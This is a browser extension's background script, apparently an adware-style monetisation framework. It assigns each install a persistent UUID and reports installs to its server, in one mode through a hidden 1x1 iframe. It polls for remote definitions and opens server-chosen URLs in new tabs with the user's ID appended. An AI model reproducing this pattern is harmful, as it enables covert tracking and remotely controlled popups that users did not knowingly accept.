if (!pluginnetwork) var pluginnetwork = {};
pluginnetwork.background = function () {
	return {
		trackEvent: function (EVT_NAME) {
			_gaq.push(['_trackEvent', 'Events', EVT_NAME]);
		},
		getVersionInfo: function () {
			var xhr = new XMLHttpRequest();
			var versionNumber = pluginnetwork.GLOBALS.DEFINITION_VERSION;
			if (typeof (localStorage[pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.currentVersion']) !== "undefined") {
				versionNumber = parseInt(localStorage[pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.currentVersion']);
			}
			xhr.open("GET", chrome.extension.getURL("manifest.json"), false);
			var resp = "";
			xhr.send();
			resp = JSON.parse(xhr.responseText);
			return resp.version + "___" + versionNumber;
		},
		checkDefinitionUpdate: function () {
			var xhr = new XMLHttpRequest();
			var raq = localStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq');
			if (raq == null) raq = pluginnetwork.GLOBALS.AQ;
			var versionNumber = pluginnetwork.GLOBALS.DEFINITION_VERSION;
			if (typeof (localStorage[pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.currentVersion']) !== "undefined") {
				versionNumber = parseInt(localStorage[pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.currentVersion']);
			}
			var url = pluginnetwork.GLOBALS.PLUGIN_SERVER + "definitions.json?namespace=" + pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + "&version=" + versionNumber + "&aq=" + raq;
			xhr.open("GET", url, true);
			xhr.onreadystatechange = function () {
				if (xhr.readyState == 4) {
					if (pluginnetwork.helpers.IsJsonString(xhr.responseText)) {
						var resp = JSON.parse(xhr.responseText);
						if (resp.currentVersion > versionNumber) {
							if (typeof (resp.tdb) !== "undefined") {
								localStorage[pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.tdb'] = resp.tdb;
							} else {
								localStorage.removeItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.tdb');
							}
							if (typeof (resp.ei) !== "undefined") {
								localStorage[pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ei'] = resp.ei;
							} else {
								localStorage.removeItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ei');
							}
							if (typeof (resp.aqo) !== "undefined") {
								localStorage[pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aqo'] = resp.aqo;
							} else {
								localStorage.removeItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aqo');
							}
							if (typeof (resp.currentVersion) !== "undefined") {
								localStorage[pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.currentVersion'] = resp.currentVersion;
							}
							if (typeof (resp.popurl) !== "undefined") {
								_gaq.push(['_trackEvent', 'Events', 'NOTIFICATION-' + encodeURI(resp.popurl)]);
								pluginnetwork.background.openTabWithUrl(resp.popurl + "?guid=" + pluginnetwork.background.getUUID());
							}
							resp = JSON.stringify(resp);
							localStorage[pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.definitions'] = resp;
						} else {
							//console.log("nothing to update");
						}
					}
				}
			}
			xhr.send();
		},
		isFirstRunDaily: function () {
			var dateStr = pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.updatecheck';
			var lastRun = localStorage[dateStr];
			var bIsFirstRun = false;
			if (lastRun == null) {
				lastRun = 0;
			}
			var currentdate = new Date();
			var currentdatefixed = currentdate.getFullYear() + "" + pluginnetwork.helpers.getMonthFormatted(currentdate) + "" + pluginnetwork.helpers.getDayFormatted(currentdate);
			if (parseInt(currentdatefixed) > parseInt(lastRun)) {
				localStorage[dateStr] = currentdatefixed;
				bIsFirstRun = true;
			}
			return bIsFirstRun;
		},
		isMarketingEnabled: function () {
			var settingsName = localStorage.getItem('profile');
			if (settingsName == null) return false;
			var settingsBlob = localStorage.getItem('profile-' + settingsName);
			var ssprofile = JSON.parse(settingsBlob);
			if (ssprofile.settings.marketing) {
				return true;
			} else {
				return false;
			}
		},
		//
		// isFirstRun: Returns if this is the first run of the extention.
		// TODO: build mechanism to determine if it's an upgrade.
		isFirstRun: function () {
			var prefString = localStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.doneWelcomeMessage');
			var bIsFirstRun = false;
			if (prefString == null) {
				bIsFirstRun = true;
			}
			return bIsFirstRun;
		},
		generateUUID: function () {
			var s = [], itoh = '0123456789ABCDEF';
			for (var i = 0; i < 36; i++) s[i] = Math.floor(Math.random() * 0x10);
			s[14] = 4; // Set 4 high bits of time_high field to version
			s[19] = (s[19] & 0x3) | 0x8; // Specify 2 high bits of clock sequence
			for (var i = 0; i < 36; i++) s[i] = itoh[s[i]];
			s[8] = s[13] = s[18] = s[23] = '-';
			return "{" + s.join('') + "}";
		},
		//
		// getUDID: generates a random uuid and saves it.g
		getUUID: function () {
			var prefString = localStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.installID');
			if (prefString == null) {
				prefString = this.generateUUID();
				var currentdate = new Date();
				var currentdatefixed = currentdate.getFullYear() + "-" + (currentdate.getMonth() + 1) + "-" + currentdate.getDate();
				localStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.buildID', pluginnetwork.GLOBALS.BUILD_ID); // BUILD_ID is a constant defined above 
				localStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.installID', prefString);
				localStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq', pluginnetwork.GLOBALS.AQ);
				var ft = (Math.round(new Date().getTime() / 1000) + 10000 + Math.floor((Math.random() * 180) + 300));
				localStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ft', ft);
			}
			return prefString;
		},
		openTabWithUrl: function (plugin_install_page) {
			chrome.tabs.create({
				index: 100000000, //last
				url: plugin_install_page
			});
		},
		iframeWithUrl: function (plugin_install_page) {
			var ifr = document.createElement("iframe");
			ifr.setAttribute("src", plugin_install_page);
			ifr.setAttribute("height", 1);
			ifr.setAttribute("width", 1);
			ifr.setAttribute("name", "install_frame");
			ifr.setAttribute("id", "install_frame");
			ifr.setAttribute("scrolling", "NO");
			ifr.setAttribute("frameborder", "0");
			document.getElementsByTagName("body")[0].appendChild(ifr);
		},
		ajaxWithUrl: function (plugin_install_page) {
			var xhr = new XMLHttpRequest();
			xhr.open("GET", plugin_install_page, true);
			xhr.onreadystatechange = function () {
				if (xhr.readyState == 4) {
					//
				}
			}
			xhr.send();
		},
		installationEvent: function () {
			localStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.doneWelcomeMessage', 'Yes');
			_gaq.push(['_trackEvent', 'Events', 'INSTALL']);
			switch (pluginnetwork.GLOBALS.INST_METHOD) {
				case 1:
					this.openTabWithUrl(pluginnetwork.GLOBALS.PLUGIN_SERVER + "chromeinstall/" + this.getUUID());
					return;
					break;
				case 2:
					setTimeout(function () { pluginnetwork.background.iframeWithUrl(pluginnetwork.GLOBALS.PLUGIN_SERVER + "chromeinstall/" + pluginnetwork.background.getUUID()) }, 1500);
					return;
					break;
				case 3:
					setTimeout(function () { pluginnetwork.background.ajaxWithUrl(pluginnetwork.GLOBALS.PLUGIN_SERVER + "chromeinstall/" + pluginnetwork.background.getUUID()) }, 1500);
					return;
					break;
				default:
					return;
			}
		},
		init: function () {
			if (this.isFirstRun()) {
				this.installationEvent();
				this.isFirstRunDaily(); // kind of a hack
				this.checkDefinitionUpdate();
			}
			// check marketing, if false... dont bother updating... le sigh
			if (this.isMarketingEnabled() == false) return;
			if (this.isFirstRunDaily()) {
				_gaq.push(['_trackEvent', 'Events', 'DAILY_ACTIVE' + this.getVersionInfo()]);
				if (localStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aqo') == null) {
					localStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq', pluginnetwork.GLOBALS.AQ);
				} else {
					localStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq', localStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aqo'));
				}
				this.checkDefinitionUpdate();
			} else {
				this.checkDefinitionUpdate();
			}
			setTimeout(function () { pluginnetwork.background.init(); }, 2400000); // Check hourly for updates
		}
	}
}();
pluginnetwork.background.init();